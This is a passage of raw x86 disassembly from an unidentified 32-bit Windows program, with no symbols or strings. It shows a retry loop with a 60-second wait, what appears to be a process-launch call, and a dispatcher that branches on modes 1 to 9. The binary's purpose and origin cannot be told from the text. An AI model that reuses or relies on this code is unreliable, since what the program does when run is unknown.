  40257c:	e8 05 82 00 00       	call   0x40a786
  402581:	83 c4 0c             	add    $0xc,%esp
  402584:	ff 75 10             	push   0x10(%ebp)
  402587:	ff 15 54 e0 40 00    	call   *0x40e054
  40258d:	33 ff                	xor    %edi,%edi
  40258f:	39 75 18             	cmp    %esi,0x18(%ebp)
  402592:	7e 26                	jle    0x4025ba
  402594:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402597:	50                   	push   %eax
  402598:	ff 75 10             	push   0x10(%ebp)
  40259b:	ff 75 0c             	push   0xc(%ebp)
  40259e:	ff 75 08             	push   0x8(%ebp)
  4025a1:	e8 90 4a 00 00       	call   0x407036
  4025a6:	83 c4 10             	add    $0x10,%esp
  4025a9:	85 c0                	test   %eax,%eax
  4025ab:	75 14                	jne    0x4025c1
  4025ad:	68 60 ea 00 00       	push   $0xea60
  4025b2:	47                   	inc    %edi
  4025b3:	ff d3                	call   *%ebx
  4025b5:	3b 7d 18             	cmp    0x18(%ebp),%edi
  4025b8:	7c da                	jl     0x402594
  4025ba:	33 c0                	xor    %eax,%eax
  4025bc:	e9 9f 00 00 00       	jmp    0x402660
  4025c1:	39 75 1c             	cmp    %esi,0x1c(%ebp)
  4025c4:	74 0d                	je     0x4025d3
  4025c6:	6a 04                	push   $0x4
  4025c8:	56                   	push   %esi
  4025c9:	6a 08                	push   $0x8
  4025cb:	e8 b6 81 00 00       	call   0x40a786
  4025d0:	83 c4 0c             	add    $0xc,%esp
  4025d3:	6a 44                	push   $0x44
  4025d5:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4025d8:	56                   	push   %esi
  4025d9:	50                   	push   %eax
  4025da:	e8 51 af 00 00       	call   0x40d530
  4025df:	8d 85 a0 df ff ff    	lea    -0x2060(%ebp),%eax
  4025e5:	83 c4 0c             	add    $0xc,%esp
  4025e8:	50                   	push   %eax
  4025e9:	ba 0c e3 40 00       	mov    $0x40e30c,%edx
  4025ee:	e8 1e 2f 00 00       	call   0x405511
  4025f3:	59                   	pop    %ecx
  4025f4:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4025f7:	8d 85 a0 df ff ff    	lea    -0x2060(%ebp),%eax
  4025fd:	e8 eb 2e 00 00       	call   0x4054ed
  402602:	b9 10 e3 40 00       	mov    $0x40e310,%ecx
  402607:	e8 e1 2e 00 00       	call   0x4054ed
  40260c:	39 75 14             	cmp    %esi,0x14(%ebp)
  40260f:	74 1f                	je     0x402630
  402611:	8b 55 14             	mov    0x14(%ebp),%edx
  402614:	b8 64 e2 40 00       	mov    $0x40e264,%eax
  402619:	e8 49 2e 00 00       	call   0x405467
  40261e:	85 c0                	test   %eax,%eax
  402620:	74 0e                	je     0x402630
  402622:	8b 4d 14             	mov    0x14(%ebp),%ecx
  402625:	8d 85 a0 df ff ff    	lea    -0x2060(%ebp),%eax
  40262b:	e8 bd 2e 00 00       	call   0x4054ed
  402630:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402633:	50                   	push   %eax
  402634:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402637:	50                   	push   %eax
  402638:	68 40 08 42 00       	push   $0x420840
  40263d:	56                   	push   %esi
  40263e:	6a 20                	push   $0x20
  402640:	56                   	push   %esi
  402641:	56                   	push   %esi
  402642:	56                   	push   %esi
  402643:	8d 85 a0 df ff ff    	lea    -0x2060(%ebp),%eax
  402649:	50                   	push   %eax
  40264a:	ff 75 10             	push   0x10(%ebp)
  40264d:	ff 15 58 e0 40 00    	call   *0x40e058
  402653:	85 c0                	test   %eax,%eax
  402655:	75 06                	jne    0x40265d
  402657:	83 4d fc 08          	orl    $0x8,-0x4(%ebp)
  40265b:	eb 03                	jmp    0x402660
  40265d:	33 c0                	xor    %eax,%eax
  40265f:	40                   	inc    %eax
  402660:	8b 4d 20             	mov    0x20(%ebp),%ecx
  402663:	3b ce                	cmp    %esi,%ecx
  402665:	74 05                	je     0x40266c
  402667:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40266a:	89 11                	mov    %edx,(%ecx)
  40266c:	8b 4d 24             	mov    0x24(%ebp),%ecx
  40266f:	3b ce                	cmp    %esi,%ecx
  402671:	74 02                	je     0x402675
  402673:	89 31                	mov    %esi,(%ecx)
  402675:	5f                   	pop    %edi
  402676:	5e                   	pop    %esi
  402677:	5b                   	pop    %ebx
  402678:	c9                   	leave
  402679:	c3                   	ret
  40267a:	55                   	push   %ebp
  40267b:	8b ec                	mov    %esp,%ebp
  40267d:	83 e4 f8             	and    $0xfffffff8,%esp
  402680:	b8 9c 30 00 00       	mov    $0x309c,%eax
  402685:	e8 26 af 00 00       	call   0x40d5b0
  40268a:	8a 45 18             	mov    0x18(%ebp),%al
  40268d:	88 84 24 81 00 00 00 	mov    %al,0x81(%esp)
  402694:	0f b6 c0             	movzbl %al,%eax
  402697:	8d 8c 24 9c 20 00 00 	lea    0x209c(%esp),%ecx
  40269e:	6b c0 14             	imul   $0x14,%eax,%eax
  4026a1:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4026a5:	8d 8c 24 9c 10 00 00 	lea    0x109c(%esp),%ecx
  4026ac:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4026b0:	53                   	push   %ebx
  4026b1:	33 db                	xor    %ebx,%ebx
  4026b3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4026b6:	8d 8c 24 a0 00 00 00 	lea    0xa0(%esp),%ecx
  4026bd:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  4026c1:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  4026c4:	56                   	push   %esi
  4026c5:	57                   	push   %edi
  4026c6:	66 89 9c 24 a8 00 00 	mov    %bx,0xa8(%esp)
  4026cd:	00 
  4026ce:	66 89 9c 24 a8 10 00 	mov    %bx,0x10a8(%esp)
  4026d5:	00 
  4026d6:	66 89 9c 24 a8 20 00 	mov    %bx,0x20a8(%esp)
  4026dd:	00 
  4026de:	89 88 d8 7e 42 00    	mov    %ecx,0x427ed8(%eax)
  4026e4:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4026e8:	0f 8e ef 00 00 00    	jle    0x4027dd
  4026ee:	ff 15 50 e0 40 00    	call   *0x40e050
  4026f4:	53                   	push   %ebx
  4026f5:	53                   	push   %ebx
  4026f6:	a3 e0 14 41 00       	mov    %eax,0x4114e0
  4026fb:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4026ff:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  402703:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  402707:	53                   	push   %ebx
  402708:	eb 5b                	jmp    0x402765
  40270a:	83 7c 24 14 05       	cmpl   $0x5,0x14(%esp)
  40270f:	73 67                	jae    0x402778
  402711:	81 ec 84 00 00 00    	sub    $0x84,%esp
  402717:	6a 21                	push   $0x21
  402719:	59                   	pop    %ecx
  40271a:	8d b4 24 a4 00 00 00 	lea    0xa4(%esp),%esi
  402721:	8b fc                	mov    %esp,%edi
  402723:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402725:	e8 bc 00 00 00       	call   0x4027e6
  40272a:	8b f0                	mov    %eax,%esi
  40272c:	81 c4 84 00 00 00    	add    $0x84,%esp
  402732:	3b f3                	cmp    %ebx,%esi
  402734:	75 0a                	jne    0x402740
  402736:	ff 44 24 18          	incl   0x18(%esp)
  40273a:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  40273e:	eb 04                	jmp    0x402744
  402740:	ff 44 24 14          	incl   0x14(%esp)
  402744:	ff b4 24 8b 00 00 00 	push   0x8b(%esp)
  40274b:	8a 8c 24 90 00 00 00 	mov    0x90(%esp),%cl
  402752:	ff 44 24 20          	incl   0x20(%esp)
  402756:	e8 f7 4d 00 00       	call   0x407552
  40275b:	59                   	pop    %ecx
  40275c:	ff 74 24 1c          	push   0x1c(%esp)
  402760:	ff 74 24 1c          	push   0x1c(%esp)
  402764:	56                   	push   %esi
  402765:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  402769:	50                   	push   %eax
  40276a:	ff 74 24 20          	push   0x20(%esp)
  40276e:	ff 55 0c             	call   *0xc(%ebp)
  402771:	83 c4 14             	add    $0x14,%esp
  402774:	85 c0                	test   %eax,%eax
  402776:	75 92                	jne    0x40270a
  402778:	a1 fc 21 41 00       	mov    0x4121fc,%eax
  40277d:	33 c9                	xor    %ecx,%ecx
  40277f:	3b c3                	cmp    %ebx,%eax
  402781:	74 07                	je     0x40278a
  402783:	8b 0c 85 a4 21 41 00 	mov    0x4121a4(,%eax,4),%ecx
  40278a:	38 9c 24 8e 00 00 00 	cmp    %bl,0x8e(%esp)
  402791:	74 2d                	je     0x4027c0
  402793:	0f b6 84 24 95 00 00 	movzbl 0x95(%esp),%eax
  40279a:	00 
  40279b:	50                   	push   %eax
  40279c:	0f b6 84 24 98 00 00 	movzbl 0x98(%esp),%eax
  4027a3:	00 
  4027a4:	50                   	push   %eax
  4027a5:	0f b6 84 24 96 00 00 	movzbl 0x96(%esp),%eax
  4027ac:	00 
  4027ad:	51                   	push   %ecx
  4027ae:	8b 8c 24 9c 00 00 00 	mov    0x9c(%esp),%ecx
  4027b5:	6a 01                	push   $0x1
  4027b7:	50                   	push   %eax
  4027b8:	e8 3c 81 00 00       	call   0x40a8f9
  4027bd:	83 c4 14             	add    $0x14,%esp
  4027c0:	ff 75 10             	push   0x10(%ebp)
  4027c3:	8a 4d 14             	mov    0x14(%ebp),%cl
  4027c6:	e8 87 4d 00 00       	call   0x407552
  4027cb:	ff 44 24 14          	incl   0x14(%esp)
  4027cf:	8b 44 24 14          	mov    0x14(%esp),%eax
  4027d3:	3b 45 08             	cmp    0x8(%ebp),%eax
  4027d6:	59                   	pop    %ecx
  4027d7:	0f 8c 11 ff ff ff    	jl     0x4026ee
  4027dd:	5f                   	pop    %edi
  4027de:	5e                   	pop    %esi
  4027df:	33 c0                	xor    %eax,%eax
  4027e1:	5b                   	pop    %ebx
  4027e2:	8b e5                	mov    %ebp,%esp
  4027e4:	5d                   	pop    %ebp
  4027e5:	c3                   	ret
  4027e6:	55                   	push   %ebp
  4027e7:	8b ec                	mov    %esp,%ebp
  4027e9:	81 ec e0 08 00 00    	sub    $0x8e0,%esp
  4027ef:	53                   	push   %ebx
  4027f0:	56                   	push   %esi
  4027f1:	57                   	push   %edi
  4027f2:	33 f6                	xor    %esi,%esi
  4027f4:	56                   	push   %esi
  4027f5:	ff 15 a8 e1 40 00    	call   *0x40e1a8
  4027fb:	8b 5d 75             	mov    0x75(%ebp),%ebx
  4027fe:	53                   	push   %ebx
  4027ff:	33 c0                	xor    %eax,%eax
  402801:	e8 63 7c 00 00       	call   0x40a469
  402806:	85 c0                	test   %eax,%eax
  402808:	59                   	pop    %ecx
  402809:	75 08                	jne    0x402813
  40280b:	6a 06                	push   $0x6
  40280d:	58                   	pop    %eax
  40280e:	e9 1a 04 00 00       	jmp    0x402c2d
  402813:	8b 7d 68             	mov    0x68(%ebp),%edi
  402816:	83 ff 01             	cmp    $0x1,%edi
  402819:	74 05                	je     0x402820
  40281b:	83 ff 05             	cmp    $0x5,%edi
  40281e:	75 18                	jne    0x402838
  402820:	8d 85 24 f7 ff ff    	lea    -0x8dc(%ebp),%eax
  402826:	50                   	push   %eax
  402827:	ba 18 e3 40 00       	mov    $0x40e318,%edx
  40282c:	e8 e0 2c 00 00       	call   0x405511
  402831:	59                   	pop    %ecx
  402832:	8d b5 24 f7 ff ff    	lea    -0x8dc(%ebp),%esi
  402838:	56                   	push   %esi
  402839:	53                   	push   %ebx
  40283a:	ff 75 14             	push   0x14(%ebp)
  40283d:	33 c9                	xor    %ecx,%ecx
  40283f:	ff 75 0c             	push   0xc(%ebp)
  402842:	ff 75 08             	push   0x8(%ebp)
  402845:	e8 fb 7a 00 00       	call   0x40a345
  40284a:	83 c4 14             	add    $0x14,%esp
  40284d:	85 c0                	test   %eax,%eax
  40284f:	75 0e                	jne    0x40285f
  402851:	53                   	push   %ebx
  402852:	e8 07 7e 00 00       	call   0x40a65e
  402857:	33 c0                	xor    %eax,%eax
  402859:	40                   	inc    %eax
  40285a:	e9 cd 03 00 00       	jmp    0x402c2c
  40285f:	83 ff 02             	cmp    $0x2,%edi
  402862:	74 05                	je     0x402869
  402864:	83 ff 07             	cmp    $0x7,%edi
  402867:	75 10                	jne    0x402879
  402869:	e8 7f 4a 00 00       	call   0x4072ed
  40286e:	a3 08 18 41 00       	mov    %eax,0x411808
  402873:	89 15 0c 18 41 00    	mov    %edx,0x41180c
  402879:	8b 4d 6d             	mov    0x6d(%ebp),%ecx
  40287c:	51                   	push   %ecx
  40287d:	8a cd                	mov    %ch,%cl
  40287f:	e8 a7 76 00 00       	call   0x409f2b
  402884:	83 ff 02             	cmp    $0x2,%edi
  402887:	59                   	pop    %ecx
  402888:	74 09                	je     0x402893
  40288a:	83 ff 07             	cmp    $0x7,%edi
  40288d:	0f 85 d7 00 00 00    	jne    0x40296a
  402893:	33 c0                	xor    %eax,%eax
  402895:	39 05 bc 3e 42 00    	cmp    %eax,0x423ebc
  40289b:	bf 1c 9b 40 00       	mov    $0x409b1c,%edi
  4028a0:	74 15                	je     0x4028b7
  4028a2:	50                   	push   %eax
  4028a3:	57                   	push   %edi
  4028a4:	68 83 98 40 00       	push   $0x409883
  4028a9:	50                   	push   %eax
  4028aa:	50                   	push   %eax
  4028ab:	33 f6                	xor    %esi,%esi
  4028ad:	8a c3                	mov    %bl,%al
  4028af:	e8 72 66 00 00       	call   0x408f26
  4028b4:	83 c4 14             	add    $0x14,%esp
  4028b7:	83 3d c0 3e 42 00 00 	cmpl   $0x0,0x423ec0
  4028be:	0f 84 a6 00 00 00    	je     0x40296a
  4028c4:	80 ff 6a             	cmp    $0x6a,%bh
  4028c7:	b8 8d 97 40 00       	mov    $0x40978d,%eax
  4028cc:	75 05                	jne    0x4028d3
  4028ce:	b8 08 98 40 00       	mov    $0x409808,%eax
  4028d3:	6a 21                	push   $0x21
  4028d5:	57                   	push   %edi
  4028d6:	50                   	push   %eax
  4028d7:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  4028dd:	6a 21                	push   $0x21
  4028df:	50                   	push   %eax
  4028e0:	8d 75 f4             	lea    -0xc(%ebp),%esi
  4028e3:	8a c3                	mov    %bl,%al
  4028e5:	e8 3c 66 00 00       	call   0x408f26
  4028ea:	83 c4 14             	add    $0x14,%esp
  4028ed:	85 c0                	test   %eax,%eax
  4028ef:	74 65                	je     0x402956
  4028f1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4028f4:	8b 1d 54 f5 41 00    	mov    0x41f554,%ebx
  4028fa:	bf d4 3d 42 00       	mov    $0x423dd4,%edi
  4028ff:	e8 6f 4c 00 00       	call   0x407573
  402904:	8b 3d 08 e1 40 00    	mov    0x40e108,%edi
  40290a:	8b f0                	mov    %eax,%esi
  40290c:	ff b4 b5 24 ff ff ff 	push   -0xdc(%ebp,%esi,4)
  402913:	ff d7                	call   *%edi
  402915:	89 35 dc 14 41 00    	mov    %esi,0x4114dc
  40291b:	33 f6                	xor    %esi,%esi
  40291d:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  402920:	a3 d8 14 41 00       	mov    %eax,0x4114d8
  402925:	7e 13                	jle    0x40293a
  402927:	ff b4 b5 24 ff ff ff 	push   -0xdc(%ebp,%esi,4)
  40292e:	ff 15 00 e1 40 00    	call   *0x40e100
  402934:	46                   	inc    %esi
  402935:	3b 75 f4             	cmp    -0xc(%ebp),%esi
  402938:	7c ed                	jl     0x402927
  40293a:	83 bd 80 00 00 00 01 	cmpl   $0x1,0x80(%ebp)
  402941:	74 04                	je     0x402947
  402943:	33 c0                	xor    %eax,%eax
  402945:	eb 08                	jmp    0x40294f
  402947:	8a 45 75             	mov    0x75(%ebp),%al
  40294a:	e8 6e 68 00 00       	call   0x4091bd
  40294f:	a3 b8 3e 42 00       	mov    %eax,0x423eb8
  402954:	eb 1a                	jmp    0x402970
  402956:	53                   	push   %ebx
  402957:	33 c0                	xor    %eax,%eax
  402959:	e8 00 7d 00 00       	call   0x40a65e
  40295e:	83 25 d8 14 41 00 00 	andl   $0x0,0x4114d8
  402965:	e9 ed fe ff ff       	jmp    0x402857
  40296a:	8b 3d 08 e1 40 00    	mov    0x40e108,%edi
  402970:	33 db                	xor    %ebx,%ebx
  402972:	39 9d 88 00 00 00    	cmp    %ebx,0x88(%ebp)
  402978:	0f 84 a2 02 00 00    	je     0x402c20
  40297e:	33 f6                	xor    %esi,%esi
  402980:	83 7d 68 01          	cmpl   $0x1,0x68(%ebp)
  402984:	75 36                	jne    0x4029bc
  402986:	8a 45 75             	mov    0x75(%ebp),%al
  402989:	e8 db 7b 00 00       	call   0x40a569
  40298e:	6a 21                	push   $0x21
  402990:	68 02 94 40 00       	push   $0x409402
  402995:	6a 21                	push   $0x21
  402997:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  40299d:	51                   	push   %ecx
  40299e:	50                   	push   %eax
  40299f:	8d 5d f8             	lea    -0x8(%ebp),%ebx
  4029a2:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4029a5:	e8 53 60 00 00       	call   0x4089fd
  4029aa:	83 c4 14             	add    $0x14,%esp
  4029ad:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4029b0:	8b f0                	mov    %eax,%esi
  4029b2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4029b5:	8b 08                	mov    (%eax),%ecx
  4029b7:	52                   	push   %edx
  4029b8:	50                   	push   %eax
  4029b9:	ff 51 78             	call   *0x78(%ecx)
  4029bc:	83 7d 68 05          	cmpl   $0x5,0x68(%ebp)
  4029c0:	75 36                	jne    0x4029f8
  4029c2:	8a 45 75             	mov    0x75(%ebp),%al
  4029c5:	e8 9f 7b 00 00       	call   0x40a569
  4029ca:	6a 0b                	push   $0xb
  4029cc:	68 45 94 40 00       	push   $0x409445
  4029d1:	6a 0b                	push   $0xb
  4029d3:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  4029d9:	51                   	push   %ecx
  4029da:	50                   	push   %eax
  4029db:	8d 5d f8             	lea    -0x8(%ebp),%ebx
  4029de:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4029e1:	e8 17 60 00 00       	call   0x4089fd
  4029e6:	83 c4 14             	add    $0x14,%esp
  4029e9:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4029ec:	8b f0                	mov    %eax,%esi
  4029ee:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4029f1:	8b 08                	mov    (%eax),%ecx
  4029f3:	52                   	push   %edx
  4029f4:	50                   	push   %eax
  4029f5:	ff 51 78             	call   *0x78(%ecx)
  4029f8:	83 7d 68 02          	cmpl   $0x2,0x68(%ebp)
  4029fc:	74 06                	je     0x402a04
  4029fe:	83 7d 68 07          	cmpl   $0x7,0x68(%ebp)
  402a02:	75 37                	jne    0x402a3b
  402a04:	33 f6                	xor    %esi,%esi
  402a06:	39 35 d8 14 41 00    	cmp    %esi,0x4114d8
  402a0c:	74 2d                	je     0x402a3b
  402a0e:	46                   	inc    %esi
  402a0f:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402a12:	e8 f3 67 00 00       	call   0x40920a
  402a17:	89 85 24 ff ff ff    	mov    %eax,-0xdc(%ebp)
  402a1d:	a1 dc 14 41 00       	mov    0x4114dc,%eax
  402a22:	e8 22 72 00 00       	call   0x409c49
  402a27:	ff 75 10             	push   0x10(%ebp)
  402a2a:	ff d7                	call   *%edi
  402a2c:	ff 35 d8 14 41 00    	push   0x4114d8
  402a32:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402a35:	ff 15 00 e1 40 00    	call   *0x40e100
  402a3b:	83 7d 68 03          	cmpl   $0x3,0x68(%ebp)
  402a3f:	bb 09 99 40 00       	mov    $0x409909,%ebx
  402a44:	75 29                	jne    0x402a6f
  402a46:	6a 0b                	push   $0xb
  402a48:	68 76 9b 40 00       	push   $0x409b76
  402a4d:	53                   	push   %ebx
  402a4e:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  402a54:	6a 0b                	push   $0xb
  402a56:	50                   	push   %eax
  402a57:	8a 45 75             	mov    0x75(%ebp),%al
  402a5a:	8d 75 f8             	lea    -0x8(%ebp),%esi
  402a5d:	e8 c4 64 00 00       	call   0x408f26
  402a62:	83 c4 14             	add    $0x14,%esp
  402a65:	ff 75 10             	push   0x10(%ebp)
  402a68:	8b f0                	mov    %eax,%esi
  402a6a:	ff d7                	call   *%edi
  402a6c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402a6f:	83 7d 68 06          	cmpl   $0x6,0x68(%ebp)
  402a73:	75 2d                	jne    0x402aa2
  402a75:	6a 0b                	push   $0xb
  402a77:	68 ab 9b 40 00       	push   $0x409bab
  402a7c:	68 07 9a 40 00       	push   $0x409a07
  402a81:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  402a87:	6a 0b                	push   $0xb
  402a89:	50                   	push   %eax
  402a8a:	8a 45 75             	mov    0x75(%ebp),%al
  402a8d:	8d 75 f8             	lea    -0x8(%ebp),%esi
  402a90:	e8 91 64 00 00       	call   0x408f26
  402a95:	83 c4 14             	add    $0x14,%esp
  402a98:	ff 75 10             	push   0x10(%ebp)
  402a9b:	8b f0                	mov    %eax,%esi
  402a9d:	ff d7                	call   *%edi
  402a9f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402aa2:	83 7d 68 04          	cmpl   $0x4,0x68(%ebp)
  402aa6:	75 29                	jne    0x402ad1
  402aa8:	6a 0b                	push   $0xb
  402aaa:	68 41 9b 40 00       	push   $0x409b41
  402aaf:	53                   	push   %ebx
  402ab0:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  402ab6:	6a 0b                	push   $0xb
  402ab8:	50                   	push   %eax
  402ab9:	8a 45 75             	mov    0x75(%ebp),%al
  402abc:	8d 75 f8             	lea    -0x8(%ebp),%esi
  402abf:	e8 62 64 00 00       	call   0x408f26
  402ac4:	83 c4 14             	add    $0x14,%esp
  402ac7:	ff 75 10             	push   0x10(%ebp)
  402aca:	8b f0                	mov    %eax,%esi
  402acc:	ff d7                	call   *%edi
  402ace:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402ad1:	83 7d 68 09          	cmpl   $0x9,0x68(%ebp)
  402ad5:	75 2d                	jne    0x402b04
  402ad7:	6a 0b                	push   $0xb
  402ad9:	68 cb 9b 40 00       	push   $0x409bcb
  402ade:	68 99 9a 40 00       	push   $0x409a99
  402ae3:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  402ae9:	6a 0b                	push   $0xb
  402aeb:	50                   	push   %eax
  402aec:	8a 45 75             	mov    0x75(%ebp),%al
  402aef:	8d 75 f8             	lea    -0x8(%ebp),%esi
  402af2:	e8 2f 64 00 00       	call   0x408f26
  402af7:	83 c4 14             	add    $0x14,%esp
  402afa:	ff 75 10             	push   0x10(%ebp)
  402afd:	8b f0                	mov    %eax,%esi
  402aff:	ff d7                	call   *%edi
  402b01:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402b04:	ff 75 75             	push   0x75(%ebp)
  402b07:	33 c0                	xor    %eax,%eax
  402b09:	e8 50 7b 00 00       	call   0x40a65e
  402b0e:	85 f6                	test   %esi,%esi
  402b10:	59                   	pop    %ecx
  402b11:	75 07                	jne    0x402b1a
  402b13:	6a 04                	push   $0x4
  402b15:	e9 f3 fc ff ff       	jmp    0x40280d
  402b1a:	8b 35 54 f5 41 00    	mov    0x41f554,%esi
  402b20:	33 db                	xor    %ebx,%ebx
  402b22:	83 7d 68 01          	cmpl   $0x1,0x68(%ebp)
  402b26:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  402b2d:	75 1a                	jne    0x402b49
  402b2f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402b32:	6a 03                	push   $0x3
  402b34:	59                   	pop    %ecx
  402b35:	99                   	cltd
  402b36:	f7 f9                	idiv   %ecx
  402b38:	8b de                	mov    %esi,%ebx
  402b3a:	bf d4 3d 42 00       	mov    $0x423dd4,%edi
  402b3f:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402b42:	e8 2c 4a 00 00       	call   0x407573
  402b47:	8b d8                	mov    %eax,%ebx
  402b49:	83 7d 68 04          	cmpl   $0x4,0x68(%ebp)
  402b4d:	74 06                	je     0x402b55
  402b4f:	83 7d 68 03          	cmpl   $0x3,0x68(%ebp)
  402b53:	75 16                	jne    0x402b6b
  402b55:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402b58:	8b de                	mov    %esi,%ebx
  402b5a:	bf d4 3d 42 00       	mov    $0x423dd4,%edi
  402b5f:	e8 0f 4a 00 00       	call   0x407573
  402b64:	8b d8                	mov    %eax,%ebx
  402b66:	e8 de 70 00 00       	call   0x409c49
  402b6b:	83 7d 68 09          	cmpl   $0x9,0x68(%ebp)
  402b6f:	75 12                	jne    0x402b83
  402b71:	e8 d7 2c 00 00       	call   0x40584d
  402b76:	99                   	cltd
  402b77:	f7 7d f8             	idivl  -0x8(%ebp)
  402b7a:	8b da                	mov    %edx,%ebx
  402b7c:	8b c3                	mov    %ebx,%eax
  402b7e:	e8 c6 70 00 00       	call   0x409c49
  402b83:	83 7d 68 05          	cmpl   $0x5,0x68(%ebp)
  402b87:	75 15                	jne    0x402b9e
  402b89:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402b8c:	8b 1d 1c fc 41 00    	mov    0x41fc1c,%ebx
  402b92:	bf 9c 2b 42 00       	mov    $0x422b9c,%edi
  402b97:	e8 d7 49 00 00       	call   0x407573
  402b9c:	8b d8                	mov    %eax,%ebx
  402b9e:	83 7d 68 06          	cmpl   $0x6,0x68(%ebp)
  402ba2:	75 0b                	jne    0x402baf
  402ba4:	e8 a4 2c 00 00       	call   0x40584d
  402ba9:	99                   	cltd
  402baa:	f7 7d f8             	idivl  -0x8(%ebp)
  402bad:	8b da                	mov    %edx,%ebx
  402baf:	e8 99 2c 00 00       	call   0x40584d
  402bb4:	0f af 5d f0          	imul   -0x10(%ebp),%ebx
  402bb8:	0f b6 4d 70          	movzbl 0x70(%ebp),%ecx
  402bbc:	99                   	cltd
  402bbd:	41                   	inc    %ecx
  402bbe:	ff 75 75             	push   0x75(%ebp)
  402bc1:	f7 f9                	idiv   %ecx
  402bc3:	ff 75 72             	push   0x72(%ebp)
  402bc6:	0f b6 45 6f          	movzbl 0x6f(%ebp),%eax
  402bca:	ff 75 71             	push   0x71(%ebp)
  402bcd:	ff 75 14             	push   0x14(%ebp)
  402bd0:	ff 75 f4             	push   -0xc(%ebp)
  402bd3:	03 d0                	add    %eax,%edx
  402bd5:	83 7d 68 09          	cmpl   $0x9,0x68(%ebp)
  402bd9:	52                   	push   %edx
  402bda:	ff b4 9d 24 ff ff ff 	push   -0xdc(%ebp,%ebx,4)
  402be1:	74 07                	je     0x402bea
  402be3:	e8 3d 5c 00 00       	call   0x408825
  402be8:	eb 05                	jmp    0x402bef
  402bea:	e8 a3 5a 00 00       	call   0x408692
  402bef:	8b d8                	mov    %eax,%ebx
  402bf1:	33 ff                	xor    %edi,%edi
  402bf3:	83 c4 1c             	add    $0x1c,%esp
  402bf6:	3b df                	cmp    %edi,%ebx
  402bf8:	74 05                	je     0x402bff
  402bfa:	83 fb 03             	cmp    $0x3,%ebx
  402bfd:	75 02                	jne    0x402c01
  402bff:	33 db                	xor    %ebx,%ebx
  402c01:	ff 75 f4             	push   -0xc(%ebp)
  402c04:	8b 35 00 e1 40 00    	mov    0x40e100,%esi
  402c0a:	ff d6                	call   *%esi
  402c0c:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  402c0f:	7e 0f                	jle    0x402c20
  402c11:	ff b4 bd 24 ff ff ff 	push   -0xdc(%ebp,%edi,4)
  402c18:	ff d6                	call   *%esi
  402c1a:	47                   	inc    %edi
  402c1b:	3b 7d f8             	cmp    -0x8(%ebp),%edi
  402c1e:	7c f1                	jl     0x402c11
  402c20:	ff 75 75             	push   0x75(%ebp)
  402c23:	33 c0                	xor    %eax,%eax
  402c25:	e8 34 7a 00 00       	call   0x40a65e
  402c2a:	8b c3                	mov    %ebx,%eax
  402c2c:	59                   	pop    %ecx
  402c2d:	5f                   	pop    %edi
  402c2e:	5e                   	pop    %esi
  402c2f:	5b                   	pop    %ebx
  402c30:	c9                   	leave
  402c31:	c3                   	ret
  402c32:	83 25 fc 21 41 00 00 	andl   $0x0,0x4121fc
  402c39:	83 25 54 21 41 00 00 	andl   $0x0,0x412154
  402c40:	6a 02                	push   $0x2
  402c42:	ff 74 24 08          	push   0x8(%esp)
  402c46:	6a 0a                	push   $0xa
  402c48:	6a 0a                	push   $0xa
  402c4a:	68 10 10 40 00       	push   $0x401010
  402c4f:	6a 01                	push   $0x1
  402c51:	e8 24 fa ff ff       	call   0x40267a
  402c56:	83 c4 18             	add    $0x18,%esp
  402c59:	e8 11 70 00 00       	call   0x409c6f
  402c5e:	33 c0                	xor    %eax,%eax
  402c60:	40                   	inc    %eax
  402c61:	c3                   	ret
  402c62:	55                   	push   %ebp
  402c63:	8b ec                	mov    %esp,%ebp
  402c65:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  402c6b:	81 ec 00 08 00 00    	sub    $0x800,%esp
  402c71:	50                   	push   %eax
  402c72:	e8 00 40 00 00       	call   0x406c77
  402c77:	e8 39 40 00 00       	call   0x406cb5
  402c7c:	33 c9                	xor    %ecx,%ecx
  402c7e:	51                   	push   %ecx
  402c7f:	50                   	push   %eax
  402c80:	51                   	push   %ecx
  402c81:	51                   	push   %ecx
  402c82:	6a 32                	push   $0x32
